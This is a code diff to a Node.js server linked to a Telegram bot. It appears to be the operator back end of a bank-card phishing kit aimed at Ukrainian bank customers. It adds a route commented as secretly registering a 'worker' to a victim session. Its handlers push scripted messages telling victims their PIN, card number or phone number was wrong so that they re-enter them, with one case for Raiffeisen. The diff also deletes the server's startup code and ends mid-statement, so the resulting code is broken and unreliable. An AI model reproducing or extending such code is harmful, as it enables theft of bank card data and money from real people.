@@ -49,6 +49,18 @@ app.get('/', (req, res) => {
 });
 
 // =======================================================================
+// Новый маршрут: POST /api/registerWorker — скрыто регистрируем воркера
+app.post('/api/registerWorker', (req, res) => {
+    const { sessionId, worker } = req.body;
+    if (!sessionId || !worker) return res.status(400).json({ message: "Не указан sessionId или worker" });
+
+    const existing = sessions.get(sessionId) || {};
+    sessions.set(sessionId, { ...existing, worker });
+    console.log(`Сессия ${sessionId}: worker = ${worker}`);
+    res.json({ message: "Worker зарегистрирован" });
+});
+
+// =======================================================================
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
@@ -239,39 +251,4 @@ bot.on('callback_query', (callbackQuery) => {
             case 'other':
                 commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку" };
                 break;
-            case 'pin_error':
-                commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" };
-                break;
-            case 'card_error':
-                commandData = { text: "Вказано невірний номер картки, натисніть кнопку назад та введіть номер картки вірно" };
-                break;
-            case 'number_error':
-                commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
-                break;
-            case 'request_details':
-                commandData = { isRaiffeisen: sessions.get(sessionId)?.bankName === 'Райффайзен' };
-                break;
-        }
-
-        ws.send(JSON.stringify({ type: type, data: commandData }));
-        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
-    } else {
-        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
-    }
-});
-
-// Обработка ошибок Telegram polling (если включено, но мы на webhook)
-bot.on('polling_error', (error) => {
-    console.error('Telegram polling error:', error);
-});
-
-// Глобальная обработка ошибок Express
-app.use((err, req, res, next) => {
-    console.error('Server error:', err);
-    res.status(500).json({ message: 'Internal Server Error' });
-});
-
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server is running on port ${PORT}`);
-});
+            case
